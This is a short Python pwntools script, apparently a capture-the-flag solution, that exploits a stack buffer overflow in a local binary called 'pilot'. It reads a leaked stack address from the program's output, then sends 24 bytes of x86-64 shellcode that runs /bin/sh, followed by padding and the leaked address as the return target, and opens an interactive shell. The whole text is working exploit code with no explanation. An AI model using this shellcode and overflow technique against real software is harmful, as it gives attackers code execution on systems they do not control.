from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./pilot')
#gdb.attach(p, 'break *0x400b35')

# 24 bytes
shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

p.recvuntil("Location:")
leak = int(p.recv(14),16)
p.recvline()

buf = shellcode
buf += "A" * (40 - 24)
buf += p64(leak)

p.sendline(buf)
p.interactive()
